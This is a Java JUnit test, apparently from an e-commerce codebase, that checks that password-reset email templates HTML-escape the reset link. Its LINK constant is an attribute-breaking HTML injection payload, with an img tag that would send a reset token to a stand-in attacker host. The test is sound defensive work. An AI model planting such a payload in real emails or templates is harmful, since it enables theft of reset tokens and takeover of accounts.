package com.salesmanager.test.utils;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;

import org.junit.Test;

import freemarker.template.Configuration;
import freemarker.template.Template;

public class PasswordResetEmailTemplateTest {

	private static final String LINK = "https://shop.example/\"><img src=\"https://mallory.example/leak?t=customer/DEFAULT/reset/token";

	@Test
	public void customerResetLinkIsHtmlEscaped() throws Exception {
		assertEscaped("email_template_password_reset_request_customer.ftl");
	}

	@Test
	public void userResetLinkIsHtmlEscaped() throws Exception {
		assertEscaped("email_template_password_reset_request_user.ftl");
	}

	private void assertEscaped(String templateName) throws Exception {
		Configuration configuration = new Configuration(Configuration.VERSION_2_3_23);
		configuration.setClassForTemplateLoading(PasswordResetEmailTemplateTest.class, "/templates/email");
		Template template = configuration.getTemplate(templateName);

		Map<String, String> tokens = new HashMap<>();
		for (String key : new String[] { "LOGOPATH", "LABEL_HI", "EMAIL_CUSTOMER_FIRSTNAME", "EMAIL_USER_FIRSTNAME",
				"RESET_PASSWORD_TEXT", "LABEL_LINK_TITLE", "LABEL_LINK", "EMAIL_CONTACT_OWNER", "EMAIL_DISCLAIMER",
				"EMAIL_SPAM_DISCLAIMER", "EMAIL_FOOTER_COPYRIGHT" }) {
			tokens.put(key, key);
		}
		tokens.put("RESET_PASSWORD_LINK", LINK);

		StringWriter out = new StringWriter();
		template.process(tokens, out);
		String html = out.toString();

		assertFalse(html.contains("<img src=\"https://mallory.example"));
		assertTrue(html.contains("href=\"https://shop.example/&quot;&gt;&lt;img src=&quot;https://mallory.example/leak?t="));
	}
}
